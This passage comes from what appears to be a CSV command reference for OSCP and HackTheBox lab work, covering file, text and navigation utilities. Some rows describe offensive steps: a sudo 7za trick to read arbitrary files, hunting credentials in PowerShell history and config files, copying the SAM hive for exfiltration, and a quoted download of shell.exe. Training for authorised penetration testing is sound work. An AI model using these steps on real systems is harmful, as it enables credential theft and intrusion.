Time estimate: <5 seconds","high","","","","{""permission_denied"": ""File not readable by current user. Try with sudo: sudo cat <FILE>. Or check permissions: ls -l <FILE>"", ""binary_file"": ""File is binary. Use strings <FILE> to extract readable text. Or hexdump -C <FILE> for hex view""}","","","","[""capture-root-flag""]"
"cd-change-directory","Change Directory","utilities","cd <DIRECTORY>","Change current working directory for navigation and file access","navigation","cd /var/www/html","Basic navigation command.

Common usage:
cd /home - Home directories
cd /var/www/html - Web root
cd /tmp - Temporary files
cd ~ - User home
cd - - Previous directory

Time estimate: <1 second","medium","","","","{""permission_denied"": ""No execute permission on directory. Check: ls -ld <DIRECTORY>. May need higher privileges""}","","","",""
"file-rename-extension","Rename File Extension","utilities","mv <OLD_NAME> <NEW_NAME>","Rename file to change extension for file upload bypass or correct file type identification","file-operations","mv shell.txt shell.php","File renaming for extension changes.

Common OSCP usage:
mv shell.txt shell.php - Prepare webshell
mv backup backup.zip - Correct archive extension
mv id_rsa.txt id_rsa - Fix SSH key

Time estimate: <1 second","medium","","","","{""target_exists"": ""File with new name already exists. Use -f to force: mv -f <OLD> <NEW>. Or choose different name""}","","","",""
"hosts-file-add-entry","Add Entry to /etc/hosts","utilities","echo '<IP> <HOSTNAME>' | sudo tee -a /etc/hosts","Add hostname to IP mapping in /etc/hosts file for local DNS resolution","network","echo '10.10.11.18 usage.htb' | sudo tee -a /etc/hosts","CRITICAL OSCP STEP: Map target hostname for web applications.

Workflow:
1. Add host entry (THIS COMMAND)
   echo '10.10.11.18 usage.htb' | sudo tee -a /etc/hosts
2. Verify resolution
   ping usage.htb
    Should ping 10.10.11.18
3. Access web application
   http://usage.htb

Common OSCP usage:
echo '10.10.11.18 usage.htb' | sudo tee -a /etc/hosts
echo '10.10.11.50 office.htb' | sudo tee -a /etc/hosts

Verification:
cat /etc/hosts | grep htb
ping -c 1 usage.htb

Time estimate: 5-10 seconds","high","","","","{""still_not_resolving"": ""DNS cache issue. Flush with: sudo systemd-resolve --flush-caches. Or restart DNS: sudo systemctl restart systemd-resolved"", ""duplicate_entry"": ""Entry already exists. Edit /etc/hosts manually to update. Or remove old entry first""}","{""sudo"": ""Required because /etc/hosts is system file (root-owned). Without sudo, operation fails with permission denied"", ""tee -a"": ""Append to file while also displaying output. -a flag appends instead of overwriting. Alternative to redirect (>>) but works with sudo piping""}","","","[""ping-host"", ""nmap-service-scan""]"
"capture-user-flag","Capture User Flag","utilities","cat /home/<USER>/user.txt","Read user flag file to obtain proof of user-level access on target machine","oscp-tasks","cat /home/dash/user.txt","USER FLAG CAPTURE: Proof of user-level access.

Common locations:
/home/<USER>/user.txt
/home/<USER>/Desktop/user.txt
/root/user.txt (if root is considered 'user' flag)

Workflow:
1. Enumerate users: ls -la /home
2. Find flag: find /home -name user.txt 2>/dev/null
3. Read flag (THIS COMMAND): cat /home/dash/user.txt
4. Document in proof.txt

Time estimate: 5 seconds","high","","","","{""wrong_user"": ""Flag in different user's directory. Enumerate: ls -la /home. Try each user: cat /home/*/user.txt 2>/dev/null"", ""permission_denied"": ""Need to be that user or root. Switch user: su - <USER>. Or escalate to root first""}","","","","[""check-sudo-privs"", ""linux-enumerate-users""]"
"capture-root-flag","Capture Root Flag","utilities","cat /root/root.txt","Read root flag file to obtain proof of root-level access and complete machine compromise","oscp-tasks","","ROOT FLAG CAPTURE: Proof of complete system compromise.

Common locations:
/root/root.txt
/root/proof.txt
/root/Desktop/root.txt

Workflow:
1. Escalate to root
2. Read flag (THIS COMMAND): cat /root/root.txt
3. Document in proof.txt with screenshot
4. Complete machine documentation

Time estimate: 5 seconds","high","","","","{""permission_denied"": ""Not root yet. Complete privilege escalation first. Check sudo: sudo -l. Find SUID: find / -perm -4000 2>/dev/null"", ""file_not_found"": ""May be named differently: cat /root/proof.txt. Or in alternate location: find / -name '*flag*' 2>/dev/null""}","","","[""cat-read-file""]",""
"7zip-listfile-research","Research 7zip listfile Option","utilities","7z --help | grep -i listfile","Research 7zip listfile parameter functionality for Usage machine privilege escalation vulnerability","machine-specific","","Machine-specific research for HackTheBox Usage.

7zip --list-file vulnerability allows reading arbitrary files when used with sudo.

Exploitation:
sudo /usr/bin/7za a backup.7z -t7z -snl -mhe=on -p<PASSWORD> @<FILE_TO_READ>

Time estimate: 2-5 minutes (research)","low","","","","{""not_installed"": ""7zip not installed on system. Install: sudo apt install p7zip-full. Or research online""}","","","",""
"binary-dynamic-analysis","Dynamic Binary Analysis","utilities","strings <BINARY> | grep -i <KEYWORD>","Analyze binary executable to extract readable strings and identify functionality or credentials","machine-specific","strings /usr/bin/usage_management | grep -i password","Basic binary analysis for OSCP.

Common usage:
strings binary | grep -i password
strings binary | grep -i user
strings binary | grep -i admin

Time estimate: 1-5 minutes","low","","","","{""no_useful_strings"": ""Binary may be stripped or obfuscated. Try dynamic analysis: ltrace ./binary, strace ./binary. Or decompile with Ghidra""}","","","",""
"sudo-execute-usage-management","Execute usage_management Binary with Sudo","utilities","sudo /usr/bin/usage_management","Execute usage_management binary with sudo privileges for HackTheBox Usage machine privilege escalation","machine-specific","","Machine-specific command for HackTheBox Usage.

usage_management binary exploitation:
1. Check sudo permissions: sudo -l
2. Execute binary (THIS COMMAND)
3. Exploit functionality for privilege escalation

Time estimate: Variable","low","","","","{""not_allowed"": ""User not in sudoers for this binary. Check: sudo -l. May need different exploit path""}","","","","[""7zip-listfile-research""]"
"windows-read-file-type","Windows Read File with type Command","utilities","type <FILE_PATH>","Read and display file contents in Windows CMD shell. Universal method for viewing text files (flags, credentials, configuration, logs) on any Windows version. Equivalent to Linux 'cat' command.","file-operations","type C:\Users\Administrator\Desktop\flag.txt","OSCP METHODOLOGY: File reading is FUNDAMENTAL for exam success. You MUST read flags, configuration files, and enumeration output. 'type' is the fastest method for quick reads in CMD shells.

TIME ESTIMATE: 10-30 seconds (navigate to directory + read file)

WORKFLOW:
1. Gain shell access (exploit, Evil-WinRM, RDP)
2. Navigate to target directory: cd C:\Users\Administrator\Desktop
3. Verify file exists: dir
4. Read file: type flag.txt
5. Copy flag for documentation (screenshot or copy-paste)
6. Verify flag format (32 chars MD5, 40 chars SHA1, or custom)
7. Submit flag

COMMON OSCP FILE READING TARGETS:

**1. FLAGS:**
- Admin flag: type C:\Users\Administrator\Desktop\flag.txt
- User flag: type C:\Users\<USERNAME>\Desktop\local.txt
- Proof flag: type C:\Users\Administrator\Desktop\proof.txt
- Root flag: type C:\Users\Administrator\Desktop\root.txt
- Custom locations: type C:\inetpub\wwwroot\flag.txt, type C:\temp\flag.txt

**2. CREDENTIALS IN CONFIG FILES:**
- IIS web.config: type C:\inetpub\wwwroot\web.config | findstr 'connectionString'
- Unattend.xml (local admin password): type C:\Windows\Panther\Unattend.xml | findstr 'Password'
- PHP config: type C:\xampp\htdocs\config.php | findstr 'password'
- .NET appsettings: type C:\inetpub\wwwroot\appsettings.json
- FileZilla credentials: type C:\Program Files\FileZilla Server\FileZilla Server.xml

**3. POWERSHELL HISTORY (GOLDMINE):**
```cmd
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
WHY: Captures ALL PowerShell commands from user (including passwords in plaintext).
EXAMPLE FINDINGS: net user admin P@ssw0rd, Invoke-WebRequest -Uri http://server/shell.exe -OutFile C:\temp\shell.exe

**4. ENUMERATION OUTPUT:**
- winPEAS: type C:\temp\winPEAS.txt | findstr 'Password' (find credential mentions)
- PowerUp: type C:\temp\PowerUp.txt | findstr 'Modifiable' (find writable service binaries)
- Mimikatz output: type C:\temp\creds.txt | findstr 'NTLM' (extract hashes)
- BloodHound JSON: type C:\temp\bloodhound.json (verify data collected)

**5. LOG FILES:**
- IIS logs: type C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log | findstr 'admin'
- Application logs: type C:\logs\app.log | findstr 'error'
- Custom logs: type C:\Program Files\App\debug.log

FILTERING WITH FINDSTR (GREP EQUIVALENT):
```cmd
type file.txt | findstr 'password'          # Case-insensitive search
type file.txt | findstr /i 'password'       # Explicit case-insensitive
type file.txt | findstr /i 'pass password'  # Multiple terms (OR logic)
type file.txt | findstr /i /c:'admin password'  # Phrase search
type file.txt | findstr /i /v 'comment'     # Invert match (NOT logic)
type file.txt | findstr /i /n 'password'    # Show line numbers
```

COMBINING MULTIPLE FILES:
```cmd
type C:\Users\*\Desktop\*.txt > C:\temp\all_flags.txt   # All desktop txt files
type C:\inetpub\wwwroot\*.config | findstr 'password'  # All configs with passwords
for /r C:\ %f in (*.config) do @type ""%f"" | findstr 'connectionString'  # Recursive search
```

REDIRECTION FOR EXFILTRATION:
```cmd
type C:\Users\Administrator\Desktop\flag.txt > C:\temp\exfil.txt
type C:\Windows\System32\config\SAM > C:\temp\sam.save  # SAM dump (if admin)
type multiple_files*.txt >> C:\temp\combined.txt        # Append multiple
```

ALTERNATIVE METHODS:
- PowerShell: Get-Content C:\file.txt (more features, but slower)
- Certutil: certutil -encode C:\file.txt C:\file.b64 (base64 encode for exfil)
- More command: more C:\file.txt (pagination for large files)
- Evil-WinRM download: download C:\file.txt (transfer to Kali)
- Notepad: notepad C:\file.txt (GUI required - not for shells)

VS. LINUX CAT:
- type = cat (basic read)
- type | findstr = cat | grep (search)
- type file.txt > out.txt = cat file.txt > out.txt (redirect)
- type *.txt = cat *.txt (NO - type doesn't support wildcards)
- more = less (pagination)

EXAM TIP: ALWAYS verify flag format before submitting:
- MD5: 32 hexadecimal characters (0-9, a-f)
- SHA1: 40 hexadecimal characters
- SHA256: 64 hexadecimal characters
- Custom: Varies (OSCP{...}, HTB{...}, or plain hash)

DOCUMENTATION:
- Screenshot of 'type flag.txt' output showing flag
- Include full command in screenshot: C:\Users\Administrator\Desktop> type flag.txt
- Capture timestamp if possible (include 'date /t' and 'time /t' before type)
- For report: Document exact file path and contents

COMMON MISTAKES:
 Forgetting quotes for paths with spaces: type C:\Program Files\file.txt  ""C:\Program Files\file.txt""
 Using forward slash in CMD: type C:/file.txt works but inconsistent
 Trying wildcards: type *.txt (doesn't work - use 'for' loop)
 Not checking file existence first: dir before type
 Reading binary files: Check extension before using type
 Not documenting exact command: Screenshot should show full path","high","","","","{""File not found"": ""Error: 'The system cannot find the file specified'. CAUSES: (1) Typo in path, (2) File in different location, (3) Case sensitivity in some contexts. SOLUTION: Verify path: dir C:\\Users\\Administrator\\Desktop (list directory contents). Use tab completion for autocomplete. Check current directory: cd (shows current path). Search for file: dir C:\\ /s /b | findstr flag.txt (recursive search from C:). Common flag locations: C:\\Users\\Administrator\\Desktop\\flag.txt (admin flag), C:\\Users\\<USER>\\Desktop\\local.txt (user flag)."", ""Access denied"": ""Error: 'Access is denied' when reading file. CAUSES: (1) No read permissions for current user, (2) File permissions restricted to specific group, (3) Protected system file. SOLUTION: Check permissions: icacls C:\\file.txt (shows ACL). Elevate if admin: Run shell as admin or use runas. Copy to temp with permissions: copy C:\\protected.txt C:\\temp\\readable.txt (may inherit different permissions). Alternative: Use PowerShell Get-Content with -Force flag. If really stuck: Download via Evil-WinRM: download C:\\file.txt."", ""File locked error"": ""Error: 'The process cannot access the file because it is being used by another process'. CAUSES: (1) Application has file open (IIS web.config, SQL logs), (2) Multiple shells accessing same file, (3) Windows system file in use. SOLUTION: Copy file first: copy C:\\inetpub\\wwwroot\\web.config C:\\temp\\web.config, read copy. Stop locking process: tasklist (find process), taskkill /F /PID <PID> (requires admin). Use shadow copies: vssadmin list shadows (if exists), mklink to shadow copy. Alternative: Read with PowerShell -Raw flag."", ""Binary file garbage"": ""Output shows random characters, symbols, null bytes. CAUSE: Trying to read binary file (.exe, .dll, .docx, .zip) as text. SOLUTION: Verify file type: dir C:\\file.exe (check extension). For Office docs (.docx, .xlsx): Download and open locally. For executables: Transfer to Kali for analysis: download file.exe. For compressed archives: Extract first: expand file.zip C:\\temp (built-in), then read extracted files. Use 'file' equivalent: PowerShell [System.IO.Path]::GetExtension('file.exe')."", ""Encoding issues"": ""File displays with strange characters (\ufffd, boxes) or appears empty when it has content. CAUSES: (1) Unicode/UTF-16 encoding (type expects ASCII), (2) Different codepage (non-English Windows), (3) BOM (Byte Order Mark) corruption. SOLUTION: Use PowerShell Get-Content with -Encoding: Get-Content file.txt -Encoding UTF8, Get-Content file.txt -Encoding Unicode (UTF-16). Check encoding: Get-Content file.txt -Encoding Byte | Select-Object -First 3 (look for BOM: EF BB BF = UTF-8). Convert: Get-Content file.txt | Out-File -Encoding ASCII new.txt.""}","{""type command"": ""Built-in CMD command that outputs file contents to STDOUT. NO FLAGS - simple syntax: type <file>. WHY USE: (1) Universal - works on all Windows versions (XP through 11), (2) No dependencies - always available even in restricted shells, (3) Fast - reads entire file instantly, (4) Pipeable - can combine with 'findstr' for grep-like functionality: type file.txt | findstr 'password'. LIMITATIONS: No pagination (entire file dumps at once), no line numbers, no syntax highlighting."", ""Path handling"": ""Windows paths use backslashes (\\) which are escape characters in some shells. SOLUTIONS: (1) Double backslashes in scripts: type C:\\\\Users\\\\admin\\\\file.txt, (2) Use forward slashes (Windows accepts): type C:/Users/admin/file.txt, (3) Use quotes for paths with spaces: type \""C:\\Program Files\\app\\config.ini\"", (4) Tab completion in interactive shells. RELATIVE PATHS: .\\file.txt (current directory), ..\\file.txt (parent directory), ..\\..\\Windows\\System32\\drivers\\etc\\hosts (traverse up)."", ""Redirection"": ""Redirect output to file: type input.txt > output.txt (overwrites), type input.txt >> output.txt (appends). WHY: Extract specific data for exfiltration, combine multiple files, save output for offline analysis. EXAM EXAMPLE: type C:\\Users\\*\\Desktop\\*.txt > C:\\temp\\all_flags.txt (combine all potential flags). Pipe to findstr: type web.config | findstr 'connectionString' (extract database credentials)."", ""Error handling"": ""Common errors: (1) 'The system cannot find the file specified' - file doesn't exist or wrong path, (2) 'Access is denied' - no read permissions, (3) 'The process cannot access the file because it is being used by another process' - file locked. WORKAROUNDS: Copy file first: copy locked.txt C:\\temp\\unlocked.txt, then read copy. Check existence: if exist C:\\file.txt (type C:\\file.txt) else (echo Not found).""}","","[""powershell-get-content"", ""cat-read-file""]","[""evil-winrm-download-file"", ""capture-root-flag""]"
"powershell-get-content","PowerShell Read File with Get-Content","utilities","Get-Content <FILE_PATH>","Read file contents using PowerShell cmdlet with advanced features: encoding support, filtering, tail functionality, and object pipeline. Preferred method for PowerShell environments and complex file operations.","file-operations","Get-Content C:\Users\Administrator\Desktop\flag.txt","OSCP METHODOLOGY: PowerShell Get-Content is PREFERRED when you have a PowerShell session (Evil-WinRM, PowerShell reverse shell). It provides better encoding support and filtering capabilities than CMD 'type'.

TIME ESTIMATE: 10-30 seconds (same as 'type' for simple reads, faster for filtered reads)

WORKFLOW:
1. Verify PowerShell available: $PSVersionTable (shows version)
2. Navigate to directory: cd C:\Users\Administrator\Desktop
3. List files: dir (or Get-ChildItem)
4. Read file: Get-Content flag.txt
5. Filter if needed: Get-Content log.txt | Select-String 'password'
6. Export results: Get-Content file.txt | Out-File C:\temp\export.txt

POWERSHELL FILE READING PATTERNS:

**1. BASIC READ:**
```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
cat C:\file.txt  # Alias (shorter)
gc C:\file.txt   # Shorter alias
```

**2. FILTER CONTENT (GREP EQUIVALENT):**
```powershell
Get-Content file.txt | Select-String 'password'              # Case-insensitive
Get-Content file.txt | Select-String -Pattern 'admin|root'  # Multiple patterns (OR)
Get-Content file.txt | Select-String -CaseSensitive 'Admin' # Case-sensitive
Get-Content file.txt | Select-String -NotMatch 'comment'    # Invert (NOT)
Get-Content file.txt | Select-String 'pass' -Context 2,3    # Show 2 lines before, 3 after
```

**3. TAIL FUNCTIONALITY:**
```powershell
Get-Content log.txt -Tail 10                   # Last 10 lines
Get-Content log.txt -Tail 50 | Select-String 'error'  # Last 50 lines with 'error'
Get-Content log.txt -Wait -Tail 10             # Monitor in real-time (CTRL+C to exit)
```

**4. ENCODING HANDLING:**
```powershell
Get-Content file.txt -Encoding UTF8      # UTF-8 (web configs, Linux files)
Get-Content file.txt -Encoding Unicode   # UTF-16LE (Windows Notepad default)
Get-Content file.txt -Encoding ASCII     # ASCII only (no special chars)
Get-Content file.txt -Encoding Byte      # Binary read (returns byte array)
```

**5. COMBINE MULTIPLE FILES:**
```powershell
Get-Content C:\Users\*\Desktop\*.txt                 # All desktop txt files
Get-Content C:\logs\*.log | Select-String 'error'    # All logs with errors
Get-ChildItem C:\configs\*.config | Get-Content | Select-String 'password'  # Recursive
```

**6. ADVANCED FILTERING:**
```powershell
# Extract lines between patterns
Get-Content file.txt | Select-String -Pattern 'START' -Context 0,100 | Select-String -Pattern 'END' -Context 100,0

# Count occurrences
Get-Content log.txt | Select-String 'error' | Measure-Object

# Get unique lines
Get-Content file.txt | Sort-Object -Unique

# Extract specific columns (CSV-like)
Get-Content file.txt | ForEach-Object { ($_ -split '\s+')[2] }  # 3rd column
```

**7. OUTPUT MANIPULATION:**
```powershell
# Save to variable
$content = Get-Content C:\file.txt

# Export to file
Get-Content input.txt | Out-File C:\temp\output.txt -Encoding UTF8

# Convert to single string
$text = Get-Content file.txt -Raw

# Base64 encode
$bytes = Get-Content file.exe -Encoding Byte
[Convert]::ToBase64String($bytes) | Out-File file.b64
```

**OSCP EXAM SCENARIOS:**

**Flag Retrieval:**
```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
cat C:\Users\*\Desktop\*.txt  # All user desktop files (find both user and admin flags)
```

**Credential Hunting:**
```powershell
# PowerShell history (commands with passwords)
Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String 'password'

# Unattend.xml (local admin password)
Get-Content C:\Windows\Panther\Unattend.xml -Encoding Unicode | Select-String 'Password'

# Web.config (database credentials)
Get-Content C:\inetpub\wwwroot\web.config | Select-String 'connectionString|password'

# Configuration files (various apps)
Get-ChildItem C:\ -Recurse -Include *.config,*.ini,*.xml -ErrorAction SilentlyContinue | Get-Content | Select-String 'password'
```

**Enumeration Output Analysis:**
```powershell
# winPEAS output
Get-Content C:\temp\winPEAS.txt | Select-String 'password|credential|Modifiable'

# Mimikatz output
Get-Content C:\temp\mimikatz.txt | Select-String 'NTLM|Password'

# BloodHound data verification
Get-Content C:\temp\*.json | Select-Object -First 10  # Verify JSON structure
```

**Log Analysis:**
```powershell
# IIS logs for admin activity
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\*.log -Tail 100 | Select-String 'admin|POST'

# Application logs
Get-Content C:\Program Files\App\logs\*.log | Select-String 'error|exception' -Context 2,2

# Event logs (requires Export-Csv from Get-EventLog first)
Get-Content C:\temp\security.csv | Select-String '4624|4625'  # Logon events
```

**VS. CMD TYPE:**
| Feature | Get-Content (PowerShell) | type (CMD) |
|---------|-------------------------|------------|
| Speed | Slower (object pipeline) | Faster |
| Encoding | Supports all encodings | ASCII/UTF-8 only |
| Filtering | Native (\| Select-String) | Pipe to findstr |
| Tail | -Tail flag built-in | Requires workarounds |
| Wildcards | Supports *.txt | Not supported |
| Pipeline | Object-oriented | Text stream |
| Availability | PowerShell sessions only | All CMD sessions |
| OSCP Use | Evil-WinRM, PS shells | CMD shells, universal |

**ALIASES:**
- cat  Get-Content (Linux-style)
- gc  Get-Content (short form)
- type  Get-Content (in PowerShell - NOT CMD)

**EXAM TIP:** Use Get-Content in Evil-WinRM and PowerShell reverse shells. Use CMD 'type' in basic reverse shells without PowerShell.

**COMMON MISTAKES:**
 Using Get-Content in CMD shell: 'Get-Content' is not recognized
 Wrong encoding: Get-Content web.config shows garbage  Use -Encoding UTF8
 Not filtering large files: Reading 10GB log with no filter  Use -Tail or Select-String
 Forgetting quotes for paths with spaces: Get-Content C:\Program Files\file.txt  'C:\Program Files\file.txt'
 Mixing CMD and PowerShell syntax: Get-Content file.txt | findstr 'pattern' (works but inconsistent - use Select-String)","high","","","","{""File not found"": ""Error: 'Get-Content : Cannot find path because it does not exist'. CAUSES: (1) Wrong path, (2) Typo, (3) Case sensitivity in some contexts. SOLUTION: Verify path: Test-Path C:\\file.txt (returns True/False). Use tab completion. List directory: Get-ChildItem C:\\Users\\Administrator\\Desktop. Find file recursively: Get-ChildItem C:\\ -Recurse -Filter 'flag.txt' -ErrorAction SilentlyContinue. Wildcard search: Get-Content C:\\logs\\app*.log."", ""Access denied"": ""Error: 'Access to the path is denied'. CAUSES: (1) No read permissions, (2) Admin-only file (SAM, SYSTEM), (3) Protected directory. SOLUTION: Run PowerShell as admin: Right-click \u2192 Run as Administrator, or Start-Process powershell -Verb RunAs. Check permissions: Get-Acl C:\\file.txt | Format-List. Use -Force flag: Get-Content C:\\file.txt -Force (bypasses some restrictions). Copy to accessible location: Copy-Item C:\\protected.txt C:\\temp\\readable.txt. Alternative: Download via Evil-WinRM if you have remote access."", ""Encoding issues"": ""File displays with \ufffd, boxes, or appears empty when it has content. CAUSES: (1) File is UTF-16 but PowerShell reads as UTF-8, (2) Non-ASCII characters (foreign languages), (3) BOM (Byte Order Mark) issues. SOLUTION: Try different encodings: Get-Content file.txt -Encoding Unicode (UTF-16LE), Get-Content file.txt -Encoding UTF8, Get-Content file.txt -Encoding ASCII. Detect encoding: Get-Content file.txt -Encoding Byte | Select-Object -First 3 (FF FE = UTF-16LE, FE FF = UTF-16BE, EF BB BF = UTF-8 BOM). Convert encoding: Get-Content file.txt -Encoding Unicode | Out-File -Encoding UTF8 new.txt."", ""File locked error"": ""Error: 'The process cannot access the file because it is being used by another process'. CAUSES: (1) Application has file open (IIS, SQL, logging), (2) Another PowerShell session accessing file. SOLUTION: Identify locking process: Get-Process | Where-Object {$_.Modules.FileName -eq 'C:\\file.txt'}. Stop process: Stop-Process -Name <ProcessName> -Force (requires admin). Copy file first: Copy-Item C:\\locked.txt C:\\temp\\copy.txt (may work if copy-on-read allowed). Use shadow copies: Get-CimInstance Win32_ShadowCopy (if VSS enabled), mount shadow, read from shadow path."", ""Large file performance"": ""Get-Content slow on multi-GB files. CAUSES: PowerShell loads entire file into memory as array. SOLUTION: Use -ReadCount for chunked reading: Get-Content huge.log -ReadCount 1000 | Where-Object {$_ -match 'error'} (process 1000 lines at a time). Use -Tail for recent data: Get-Content huge.log -Tail 1000. Use .NET FileStream for extreme performance: [System.IO.File]::ReadLines('C:\\huge.log') | Where-Object {$_ -match 'error'}. Alternative: Use CMD 'type' (faster for simple dumps).""}","{""Get-Content cmdlet"": ""PowerShell cmdlet (not CMD command) for reading files. ALIAS: cat, gc, type (in PowerShell context). WHY BETTER THAN CMD 'type': (1) Encoding support (-Encoding UTF8, Unicode, ASCII), (2) Filtering (-Filter), (3) Tail functionality (-Tail 10), (4) Line-based processing (returns array of lines), (5) Pipeline integration (object-oriented). TRADEOFF: Slower than CMD 'type', requires PowerShell environment."", ""-Encoding flag"": ""Specify file encoding. OPTIONS: ASCII, UTF8, UTF7, UTF32, Unicode (UTF-16LE), BigEndianUnicode (UTF-16BE), Default, Byte. SYNTAX: Get-Content file.txt -Encoding UTF8. WHY IMPORTANT: Windows files can be UTF-16 (default for Notepad), UTF-8 (web configs), or ASCII (logs). Wrong encoding shows garbage characters or missing content. DEFAULT: UTF-8 in PowerShell 6+, Unicode in PowerShell 5.1. EXAM TIP: If file appears empty or corrupted with 'type', try Get-Content with -Encoding Unicode."", ""-Tail flag"": ""Read last N lines of file (like Linux 'tail -n'). SYNTAX: Get-Content file.txt -Tail 10 (last 10 lines). WHY USEFUL: (1) Large log files - don't dump entire file, (2) Find recent entries (most recent at bottom), (3) Monitor growing files with -Wait. EXAM EXAMPLE: Get-Content C:\\inetpub\\logs\\*.log -Tail 50 | findstr 'admin' (find recent admin activity in IIS logs)."", ""-Wait flag"": ""Monitor file for new content (like 'tail -f'). SYNTAX: Get-Content file.log -Wait -Tail 10. BEHAVIOR: Displays last 10 lines, then blocks and shows new lines as appended. CTRL+C to exit. WHY USEFUL: Monitor application logs in real-time, debug running processes, watch for trigger events. EXAM SCENARIO: Monitor reverse shell payload execution: Get-Content C:\\temp\\shell.log -Wait (see errors if payload fails)."", ""-Raw flag"": ""Read entire file as single string (not array of lines). SYNTAX: Get-Content file.txt -Raw. WHY USEFUL: (1) Performance - faster for large files, (2) Preserve exact formatting (no line splitting), (3) String manipulation (regex across multiple lines), (4) Base64 encoding: [Convert]::ToBase64String([IO.File]::ReadAllBytes('file.exe')). EXAM EXAMPLE: Read multi-line certificate: Get-Content cert.pem -Raw (preserves -----BEGIN CERTIFICATE----- formatting).""}","","[""windows-read-file-type""]","[""evil-winrm-download-file"", ""capture-root-flag""]"
"sed-replace","Stream Editor Replace","custom","sed 's/<PATTERN>/<REPLACEMENT>/g' <FILE>","Find and replace text in files using stream editor","","sed 's/old_text/new_text/g' config.txt","Useful for modifying exploit payloads or cleaning up output","medium","","","","","{""-i"": ""In-place editing (modify file directly)"", ""-e"": ""Execute multiple expressions"", ""s///g"": ""Substitute - g means global (all occurrences)""}","","",""
"awk-print","AWK Text Processing","custom","awk '{print $<FIELD>}' <FILE>","Extract and process fields from text","","awk '{print $1}' output.txt","Great for extracting specific columns from command output","medium","","","","","{""-F"": ""Field separator (default: whitespace)"", ""NR"": ""Current line number"", ""NF"": ""Number of fields in current line""}","","[""cut-fields""]",""
"cut-fields","Cut Fields","custom","cut -d '<DELIM>' -f <FIELDS> <FILE>","Extract specific fields from delimited text","","cut -d ':' -f 1,3 /etc/passwd","Example:
cut -d ':' -f 1 /etc/passwd extracts usernames","medium","","","","","{""-d"": ""Delimiter character"", ""-f"": ""Field numbers"", ""-c"": ""Cut by character position instead of fields""}","","[""awk-print""]",""
"sort-lines","Sort Lines","custom","sort <FILE>","Sort lines of text alphabetically","","sort wordlist.txt","Often combined with uniq to remove duplicates","low","","","","","{""-r"": ""Reverse sort"", ""-n"": ""Numeric sort"", ""-u"": ""Unique - remove duplicates"", ""-k"": ""Sort by specific field""}","","","[""uniq-lines""]"
"uniq-lines","Remove Duplicate Lines","custom","uniq <FILE>","Remove adjacent duplicate lines (requires sorted input)","","uniq sorted.txt","Must sort first: sort file.txt | uniq","low","","","","","{""-c"": ""Count occurrences"", ""-d"": ""Only show duplicates"", ""-u"": ""Only show unique lines""}","[""sort-lines""]","",""
"tr-characters","Translate Characters","custom","tr '<SET1>' '<SET2>'","Translate or delete characters from input","","tr 'a-z' 'A-Z'","Example:
echo 'hello' | tr 'a-z' 'A-Z' converts to uppercase","medium","","","","","{""-d"": ""Delete characters in SET1"", ""-s"": ""Squeeze repeats - replace multiple occurrences with single"", ""-c"": ""Complement SET1""}","","",""
"base64-encode","Base64 Encode","custom","base64 <FILE>","Encode file or text to Base64","","base64 exploit.sh","Essential for encoding payloads and bypassing filters","high","","","","","{""-w 0"": ""Disable line wrapping (single line output)""}","","[""base64-decode""]",""
"base64-decode","Base64 Decode","custom","base64 -d <FILE>","Decode Base64 encoded data","","base64 -d encoded.txt","Use echo '<base64>' | base64 -d for inline decoding","high","","","","","{""-d"": ""Decode Base64 data""}","","[""base64-encode""]",""
"xxd-hex","Hex Dump","custom","xxd <FILE>","Create hex dump of file or reverse hex dump to binary","","xxd binary_file","Useful for analyzing binary files and creating shellcode","medium","","","","","{""-r"": ""Reverse - convert hex dump back to binary"", ""-p"": ""Plain hex dump without addresses"", ""-i"": ""Output in C include file style""}","","[""hexdump-file""]",""
"hexdump-file","Hexdump File","custom","hexdump -C <FILE>","Display file contents in hex and ASCII","","hexdump -C binary","","medium","","","","","{""-C"": ""Canonical hex+ASCII display"", ""-n"": ""Limit number of bytes to display""}","","[""xxd-hex""]",""
"strings-file","Extract Strings","enumeration","strings <FILE>","Extract printable strings from binary files","","strings program.exe","Essential for finding credentials, paths, function names in binaries","high","","","","","{""-n"": ""Minimum string length (default 4)"", ""-a"": ""Scan entire file (default: only loadable sections)"", ""-e"": ""Select encoding (s=7-bit, b=8-bit, l=16-bit little-endian)""}","","","[""hashid"", ""hash-identifier""]"
"od-octal-dump","Octal Dump","custom","od -A x -t x1z -v <FILE>","Display file in octal/hex format","","od -A x -t x1z -v binary","","low","","","","","{""-A x"": ""Display offsets in hex"", ""-t x1"": ""Display as hex bytes"", ""-v"": ""Verbose - don't abbreviate repeated lines""}","","[""xxd-hex"", ""hexdump-file""]",""
"concept-authentication","Authenticate to Domain","utilities","# Manual authentication step - establish valid domain session","Conceptual step: Establish authenticated session to Active Directory using valid credentials. Not a single command but a verification of authentication state.","","","This is a conceptual step representing authentication verification rather than a specific command. In practice, authentication happens through various tools (impacket, Rubeus, runas, etc.) depending on context.","low","","","","","","","",""
"concept-filter-accounts","Filter Service Accounts","utilities","# Manual filtering - remove computer accounts and MSAs from target list","Conceptual step: Manually filter out uncrackable accounts (computer accounts ending in $, managed service accounts) from Kerberoasting target list.","","","This is a manual analysis step where you review enumeration output and identify which accounts are worth targeting. Computer accounts have 120-character random passwords and are uncrackable.","low","","","","","","","",""
"concept-decision","Choose Attack Method","utilities","# Manual decision - evaluate trade-offs and select optimal approach","Conceptual step: Analyze available tools and methods, consider trade-offs (speed vs stealth vs detection), and select optimal approach for current scenario.","","","This represents strategic decision-making in penetration testing. Not a command to execute, but a critical thinking step to choose the right tool for the situation.","low","","","","","","","",""
"concept-enumeration","Active Directory Enumeration","utilities","# Manual enumeration - systematic AD reconnaissance with valid credentials","Conceptual step: Perform comprehensive Active Directory enumeration using various tools and techniques. Includes users, groups, computers, GPOs, ACLs, shares, and more.","","","This is an umbrella concept covering multiple enumeration commands. Standard users can still perform extensive AD reconnaissance even without admin rights.","medium","","","","","","","",""
